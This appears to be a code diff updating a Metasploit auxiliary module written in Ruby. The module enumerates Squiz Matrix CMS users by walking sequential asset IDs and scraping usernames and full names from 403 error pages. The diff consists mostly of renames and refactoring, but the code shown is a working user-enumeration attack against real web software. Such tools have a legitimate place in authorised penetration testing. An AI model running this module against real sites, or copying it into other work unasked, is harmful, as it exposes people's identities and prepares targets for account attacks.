@@ -7,7 +7,7 @@ require 'rex/proto/http'
 require 'msf/core'
 
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   # Exploit mixins should be called first
   include Msf::Exploit::Remote::HttpClient
@@ -40,15 +40,10 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('URI', [true, 'The path to users Squiz Matrix installation', '/']),
+        OptString.new('TARGETURI', [true, 'The path to users Squiz Matrix installation', '/']),
         OptInt.new('ASSETBEGIN',  [ true, "Asset ID to start at", 1]),
         OptInt.new('ASSETEND',  [ true, "Asset ID to stop at", 100]),
       ], self.class)
-  end
-
-  def target_url
-    uri = normalize_uri(datastore['URI'])
-    "http://#{vhost}:#{rport}#{uri}"
   end
 
   def run_host(ip)
@@ -65,9 +60,9 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if(@users_found.empty?)
-      print_status("#{target_url} - No users found.")
+      print_status("#{full_uri} - No users found.")
     else
-      print_good("#{target_url} - Users found: #{@users_found.keys.sort.join(", ")}")
+      print_good("#{full_uri} - Users found: #{@users_found.keys.sort.join(", ")}")
       report_note(
       :host => rhost,
       :port => rport,
@@ -106,16 +101,18 @@ class Metasploit3 < Msf::Auxiliary
 
   def do_enum(asset)
     begin
+      uri = normalize_uri(target_uri.path)
+
       res = send_request_cgi({
-        'uri'     =>  "#{target_url}?a=#{asset}",
+        'uri'     =>  "#{uri}?a=#{asset}",
         'method'  => 'GET'
       }, 20)
 
       if (datastore['VERBOSE'])
         if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(\w+)<\/i>/)
-          print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
+          print_status("#{full_uri}?a=#{asset} - Trying Asset: '#{asset}' title '#{$1}'")
         else
-          print_status("#{target_url}?a=#{asset} - Trying Asset: '#{asset}'")
+          print_status("#{full_uri}?a=#{asset} - Trying Asset: '#{asset}'")
         end
       end
 
@@ -123,25 +120,25 @@ class Metasploit3 < Msf::Auxiliary
         user=$1.strip
 
         # try the full name of the user
-        tmpasset = asset -1
+        tmpasset = asset - 1
         res = send_request_cgi({
-          'uri'     =>  "#{target_url}?a=#{tmpasset}",
+          'uri'     =>  "#{uri}?a=#{tmpasset}",
           'method'  => 'GET'
         }, 20)
         if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>Inbox<\/i>/)
-          tmpasset = asset -2
+          tmpasset = asset - 2
           res = send_request_cgi({
-            'uri'     =>  "#{target_url}?a=#{tmpasset}",
+            'uri'     =>  "#{uri}?a=#{tmpasset}",
             'method'  => 'GET'
           }, 20)
-          print_good("#{target_url}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
+          print_good("#{full_uri}?a=#{asset} - Trying to obtain fullname for Asset ID '#{asset}', '#{user}'")
           if (res and res.code = 403 and res.body and res.body =~ /You do not have permission to access <i>(.*)<\/i>/)
             fullname = $1.strip
-            print_good("#{target_url}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})")
+            print_good("#{full_uri}?a=#{tmpasset} - Squiz Matrix User Found: '#{user}' (#{fullname})")
             @users_found["#{user} (#{fullname})"] = :reported
           end
         else
-          print_good("#{target_url} - Squiz Matrix User: '#{user}'")
+          print_good("#{full_uri} - Squiz Matrix User: '#{user}'")
           @users_found[user] = :reported
         end
 
